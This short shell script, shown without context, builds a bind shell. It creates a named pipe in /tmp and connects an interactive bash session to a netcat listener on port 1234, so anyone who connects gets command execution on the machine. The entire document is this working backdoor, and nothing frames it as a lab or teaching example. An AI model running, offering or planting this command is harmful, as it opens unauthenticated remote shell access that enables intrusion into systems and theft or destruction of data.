rm -f /tmp/f; mkfifo /tmp/f
# shellcheck disable=SC2094
cat /tmp/f | bash -i 2>&1 | nc -q 0 -nvlp 1234 > /tmp/f